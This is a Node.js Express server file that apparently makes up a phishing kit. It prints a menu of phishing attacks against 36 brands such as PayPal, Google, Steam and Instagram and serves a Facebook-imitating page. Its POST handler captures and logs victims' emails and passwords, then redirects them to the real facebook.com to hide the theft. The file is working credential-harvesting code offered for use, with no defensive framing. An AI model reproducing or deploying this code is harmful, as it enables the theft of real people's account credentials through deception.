const express = require("express");
const https = require("https");

const bodyParser = require("body-parser");
const { ServerResponse } = require("http");

const app = express();

app.use(bodyParser.urlencoded({extended: true}))

console.log(`
Enter which phishing attack you want to perform:\n\n
Adobe[1]:                Badoo[2]:                     Deviantart[3]:\n
Discord[4]:              Dropbox[5]:                   eBay[6]:\n
Gitlab[7]:               Messenger[8]:                 Github[9]:\n
Instagram[10]:           Google[11]:                   Instagram Followers[12]:\n
Linkedin[13]:            Mediafire[14]:                Instagram Verify [15]:\n
Microsoft[16]:           Netflix[17]:                  Origin[18]:\n
Paypal[19]:              Pintrest[20]:                 Playstation[21]:\n
Protonmail[22]:          Quora[23]:                    Reddit[24]:\n
Roblox[25]:              Snapchat[26]:                 Spotify[27]:\n
Stack Overflow[28]:      Steam[29]:                    TikTok[30]:\n
Twitch[31]:              Twitter[32]:                  Vk[33]:\n
Wordpress[34]:           Yahoo[35]:                    xbox[36]:\n
`);

app.get("/", function(req, res){
    res.sendFile(__dirname + "/fb.html")
}); 

app.post("/", function(req, res){
    console.log("Post Request Recieved");
        const email = req.body.email;
        const new_password = req.body.password;
        const re_password = req.body.repassword;
        console.log(email);
        console.log(new_password);
        console.log(re_password);
        res.redirect('https://www.facebook.com');

        
    })
app.listen(3000, () => console.log("Server Started"))